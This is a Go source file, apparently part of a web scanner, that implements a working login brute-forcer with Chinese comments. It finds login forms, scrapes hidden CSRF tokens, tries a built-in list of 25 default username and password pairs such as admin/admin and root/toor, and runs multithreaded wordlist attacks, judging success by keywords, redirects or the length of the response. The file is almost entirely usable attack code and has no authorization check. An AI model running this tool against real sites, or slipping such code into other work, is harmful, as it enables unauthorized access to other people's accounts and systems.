package webscan

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// FormInfo 登入表單資訊
type FormInfo struct {
	ActionURL     string
	Method        string
	UsernameField string
	PasswordField string
	ExtraFields   map[string]string // hidden fields (csrf token 等)
}

// BruteResult 爆破結果
type BruteResult struct {
	Username string
	Password string
	Success  bool
	Detail   string
}

// WebBruter Web 登入爆破器
type WebBruter struct {
	TargetURL  string
	LoginURL   string
	Form       *FormInfo
	client     *http.Client
	baseBody   string // 登入失敗時的回應 body (用來比對)
	baseLen    int
	Results    []BruteResult
	mu         sync.Mutex
}

// 常見預設帳密
var DefaultCredentials = []struct {
	User string
	Pass string
}{
	{"admin", "admin"},
	{"admin", "password"},
	{"admin", "123456"},
	{"admin", "admin123"},
	{"admin", "12345678"},
	{"admin", "1234"},
	{"admin", "P@ssw0rd"},
	{"admin", "passw0rd"},
	{"administrator", "administrator"},
	{"administrator", "password"},
	{"administrator", "123456"},
	{"root", "root"},
	{"root", "password"},
	{"root", "123456"},
	{"root", "toor"},
	{"test", "test"},
	{"test", "123456"},
	{"user", "user"},
	{"user", "123456"},
	{"guest", "guest"},
	{"demo", "demo"},
	{"admin", ""},
	{"sa", "sa"},
	{"sa", "password"},
	{"operator", "operator"},
}

// NewWebBruter 建立 Web 爆破器
func NewWebBruter(targetURL string) *WebBruter {
	jar, _ := cookiejar.New(nil)
	wb := &WebBruter{
		TargetURL: targetURL,
		client: &http.Client{
			Timeout: 15 * time.Second,
			Jar:     jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 5 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
	return wb
}

// DetectLoginPage 偵測登入頁面和表單
func (wb *WebBruter) DetectLoginPage() (*FormInfo, error) {
	// 嘗試常見登入路徑
	loginPaths := []string{
		"",            // 首頁本身可能就是登入頁
		"/login",
		"/Login",
		"/signin",
		"/auth/login",
		"/user/login",
		"/admin/login",
		"/account/login",
		"/wp-login.php",
		"/index.php",
	}

	baseURL := strings.TrimRight(wb.TargetURL, "/")

	for _, path := range loginPaths {
		testURL := baseURL + path
		form, body, err := wb.parseLoginForm(testURL)
		if err != nil {
			continue
		}
		if form != nil {
			wb.LoginURL = testURL
			wb.Form = form
			wb.baseBody = body
			wb.baseLen = len(body)
			fmt.Printf("      找到登入頁面: %s\n", testURL)
			fmt.Printf("      表單 Action: %s\n", form.ActionURL)
			fmt.Printf("      帳號欄位: %s\n", form.UsernameField)
			fmt.Printf("      密碼欄位: %s\n", form.PasswordField)
			if len(form.ExtraFields) > 0 {
				for k := range form.ExtraFields {
					fmt.Printf("      隱藏欄位: %s\n", k)
				}
			}
			return form, nil
		}
	}

	return nil, fmt.Errorf("未偵測到登入表單")
}

// parseLoginForm 解析頁面中的登入表單
func (wb *WebBruter) parseLoginForm(pageURL string) (*FormInfo, string, error) {
	resp, err := wb.client.Get(pageURL)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, "", err
	}
	body := string(bodyBytes)

	// 找有 password input 的 form
	// 用 regex 找 <form ...> ... <input type="password" ...> ... </form>
	formRegex := regexp.MustCompile(`(?is)<form[^>]*>(.*?)</form>`)
	forms := formRegex.FindAllStringSubmatch(body, -1)

	// 同時抓 form 的 action 和 method
	formTagRegex := regexp.MustCompile(`(?is)<form([^>]*)>`)
	formTags := formTagRegex.FindAllStringSubmatch(body, -1)

	for i, formMatch := range forms {
		formContent := formMatch[1]

		// 確認有 password 欄位
		passRegex := regexp.MustCompile(`(?i)<input[^>]*type\s*=\s*["']password["'][^>]*>`)
		passInputs := passRegex.FindAllString(formContent, -1)
		if len(passInputs) == 0 {
			continue
		}

		info := &FormInfo{
			ExtraFields: make(map[string]string),
		}

		// 取得 form action
		if i < len(formTags) {
			attrs := formTags[i][1]
			actionRegex := regexp.MustCompile(`(?i)action\s*=\s*["']([^"']*)["']`)
			if m := actionRegex.FindStringSubmatch(attrs); len(m) > 1 {
				info.ActionURL = m[1]
			}
			methodRegex := regexp.MustCompile(`(?i)method\s*=\s*["']([^"']*)["']`)
			if m := methodRegex.FindStringSubmatch(attrs); len(m) > 1 {
				info.Method = strings.ToUpper(m[1])
			}
		}
		if info.Method == "" {
			info.Method = "POST"
		}

		// 解析 action URL
		if info.ActionURL == "" || info.ActionURL == "#" {
			info.ActionURL = pageURL
		} else if !strings.HasPrefix(info.ActionURL, "http") {
			base, _ := url.Parse(pageURL)
			ref, _ := url.Parse(info.ActionURL)
			info.ActionURL = base.ResolveReference(ref).String()
		}

		// 找 password 欄位名稱
		nameRegex := regexp.MustCompile(`(?i)name\s*=\s*["']([^"']*)["']`)
		for _, passInput := range passInputs {
			if m := nameRegex.FindStringSubmatch(passInput); len(m) > 1 {
				info.PasswordField = m[1]
				break
			}
		}

		// 找 text/email 欄位 (帳號)
		textRegex := regexp.MustCompile(`(?i)<input[^>]*type\s*=\s*["'](text|email)["'][^>]*>`)
		textInputs := textRegex.FindAllString(formContent, -1)
		// 也嘗試沒有 type 的 input（預設是 text）
		if len(textInputs) == 0 {
			plainInputRegex := regexp.MustCompile(`(?i)<input[^>]*name\s*=\s*["'][^"']*["'][^>]*>`)
			allInputs := plainInputRegex.FindAllString(formContent, -1)
			for _, inp := range allInputs {
				inpLower := strings.ToLower(inp)
				if !strings.Contains(inpLower, "type=") ||
					strings.Contains(inpLower, `type="text"`) ||
					strings.Contains(inpLower, `type='text'`) {
					if !strings.Contains(inpLower, "hidden") && !strings.Contains(inpLower, "password") {
						textInputs = append(textInputs, inp)
					}
				}
			}
		}
		for _, textInput := range textInputs {
			if m := nameRegex.FindStringSubmatch(textInput); len(m) > 1 {
				info.UsernameField = m[1]
				break
			}
		}

		// 如果沒找到帳號欄位，嘗試用 name 含 user/name/account/email/login 的 input
		if info.UsernameField == "" {
			userFieldRegex := regexp.MustCompile(`(?i)<input[^>]*name\s*=\s*["']([^"']*(?:user|name|account|email|login|id)[^"']*)["'][^>]*>`)
			if m := userFieldRegex.FindStringSubmatch(formContent); len(m) > 1 {
				info.UsernameField = m[1]
			}
		}

		// 找 hidden 欄位 (CSRF token 等)
		hiddenRegex := regexp.MustCompile(`(?i)<input[^>]*type\s*=\s*["']hidden["'][^>]*>`)
		hiddenInputs := hiddenRegex.FindAllString(formContent, -1)
		valueRegex := regexp.MustCompile(`(?i)value\s*=\s*["']([^"']*)["']`)
		for _, hidden := range hiddenInputs {
			if m := nameRegex.FindStringSubmatch(hidden); len(m) > 1 {
				name := m[1]
				value := ""
				if v := valueRegex.FindStringSubmatch(hidden); len(v) > 1 {
					value = v[1]
				}
				info.ExtraFields[name] = value
			}
		}

		if info.PasswordField != "" {
			return info, body, nil
		}
	}

	return nil, body, nil
}

// BruteForceDefault 用預設帳密嘗試
func (wb *WebBruter) BruteForceDefault() []BruteResult {
	fmt.Printf("      測試 %d 組預設帳密...\n", len(DefaultCredentials))

	for _, cred := range DefaultCredentials {
		success, detail := wb.tryLogin(cred.User, cred.Pass)
		result := BruteResult{
			Username: cred.User,
			Password: cred.Pass,
			Success:  success,
			Detail:   detail,
		}
		if success {
			fmt.Printf("      [!!!] 預設帳密破解成功! 帳號=%s 密碼=%s\n", cred.User, cred.Pass)
			wb.mu.Lock()
			wb.Results = append(wb.Results, result)
			wb.mu.Unlock()
		}
	}
	return wb.Results
}

// BruteForceWithWordlist 用字典檔爆破
func (wb *WebBruter) BruteForceWithWordlist(users, passwords []string, threads int) []BruteResult {
	total := len(users) * len(passwords)
	fmt.Printf("      帳號數: %d, 密碼數: %d, 組合數: %d\n", len(users), len(passwords), total)

	type task struct {
		user string
		pass string
	}

	var wg sync.WaitGroup
	taskCh := make(chan task, threads*2)
	done := make(chan struct{})
	attempted := 0

	for i := 0; i < threads; i++ {
		go func() {
			for t := range taskCh {
				success, detail := wb.tryLogin(t.user, t.pass)
				if success {
					wb.mu.Lock()
					wb.Results = append(wb.Results, BruteResult{
						Username: t.user,
						Password: t.pass,
						Success:  true,
						Detail:   detail,
					})
					wb.mu.Unlock()
					fmt.Printf("\n      [!!!] 爆破成功! 帳號=%s 密碼=%s\n", t.user, t.pass)
				}
				wb.mu.Lock()
				attempted++
				wb.mu.Unlock()
				wg.Done()
			}
		}()
	}

	// 進度
	go func() {
		ticker := time.NewTicker(3 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				wb.mu.Lock()
				pct := float64(attempted) / float64(total) * 100
				wb.mu.Unlock()
				fmt.Printf("\r      進度: %.1f%% (%d/%d)", pct, attempted, total)
			case <-done:
				return
			}
		}
	}()

	for _, user := range users {
		for _, pass := range passwords {
			wg.Add(1)
			taskCh <- task{user, pass}
		}
	}
	wg.Wait()
	close(taskCh)
	close(done)
	fmt.Println()

	return wb.Results
}

// tryLogin 嘗試登入一次
func (wb *WebBruter) tryLogin(username, password string) (bool, string) {
	if wb.Form == nil {
		return false, "無表單資訊"
	}

	// 每次登入前先重新取得頁面（刷新 CSRF token）
	if len(wb.Form.ExtraFields) > 0 {
		freshForm, _, err := wb.parseLoginForm(wb.LoginURL)
		if err == nil && freshForm != nil {
			wb.Form.ExtraFields = freshForm.ExtraFields
		}
	}

	// 組裝 POST 資料
	data := url.Values{}
	if wb.Form.UsernameField != "" {
		data.Set(wb.Form.UsernameField, username)
	}
	data.Set(wb.Form.PasswordField, password)
	for k, v := range wb.Form.ExtraFields {
		data.Set(k, v)
	}

	resp, err := wb.client.PostForm(wb.Form.ActionURL, data)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	respBody := string(bodyBytes)
	respLower := strings.ToLower(respBody)

	// 判斷登入是否成功的策略:

	// 1. 回應中包含明確的成功指標
	successIndicators := []string{
		"登入成功", "login success", "welcome", "dashboard",
		"登出", "logout", "sign out", "signout",
		"我的帳號", "my account", "profile",
	}
	for _, indicator := range successIndicators {
		if strings.Contains(respLower, indicator) {
			return true, fmt.Sprintf("回應包含成功指標: %s", indicator)
		}
	}

	// 2. 重導向到不同頁面 (非登入頁)
	finalURL := resp.Request.URL.String()
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		loginLower := strings.ToLower(wb.LoginURL)
		finalLower := strings.ToLower(finalURL)
		if finalLower != loginLower &&
			!strings.Contains(finalLower, "login") &&
			!strings.Contains(finalLower, "signin") &&
			!strings.Contains(finalLower, "error") {
			return true, fmt.Sprintf("重導向至: %s", finalURL)
		}
	}

	// 3. 回應中不包含失敗指標，且回應長度與失敗回應差異大
	failIndicators := []string{
		"密碼錯誤", "帳號錯誤", "登入失敗",
		"invalid", "incorrect", "failed", "error",
		"wrong password", "bad credentials",
		"authentication failed", "access denied",
	}
	hasFail := false
	for _, indicator := range failIndicators {
		if strings.Contains(respLower, indicator) {
			hasFail = true
			break
		}
	}

	// 回應長度差異超過 30% 且沒有失敗指標
	if !hasFail && wb.baseLen > 0 {
		diff := len(respBody) - wb.baseLen
		if diff < 0 {
			diff = -diff
		}
		ratio := float64(diff) / float64(wb.baseLen)
		if ratio > 0.3 {
			return true, fmt.Sprintf("回應長度差異 %.0f%% (可能成功，建議人工驗證)", ratio*100)
		}
	}

	return false, ""
}
